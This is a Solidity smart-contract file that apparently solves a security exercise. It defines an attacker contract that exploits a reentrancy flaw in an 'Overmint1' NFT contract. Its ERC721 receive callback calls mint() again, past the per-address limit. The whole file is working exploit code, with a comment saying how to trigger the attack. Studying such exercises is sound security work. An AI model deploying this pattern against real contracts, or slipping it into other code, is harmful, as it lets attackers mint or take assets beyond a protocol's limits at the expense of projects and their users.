// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint1.sol";

/**
 * To exploit the vulnerability,Attacker can call
 * the Overmint1Attacker.attack()
 * function to trigger the reentrancy attack and mint more than
 * the maximum number of NFTs per address.
 * @dev A contract that can exploit the reentrancy vulnerability in the Overmint1 contract
 */
contract Overmind1Attacker is IERC721Receiver {
    Overmint1 public nftOvermint;

    /**
     * @dev Constructs an Overmind1Attacker contract with the given Overmint1 contract address
     * @param _nftOvermint The address of the deployed Overmint1 contract
     */
    constructor(address _nftOvermint) {
        nftOvermint = Overmint1(_nftOvermint);
    }

    /**
     * @dev Calls the mint() function in the Overmint1 contract
     */
    function attack() external {
        nftOvermint.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // Overmint1 nft = Overmint1(msg.sender);
        if (!nftOvermint.success(address(this))) nftOvermint.mint();

        return IERC721Receiver.onERC721Received.selector;
    }
}
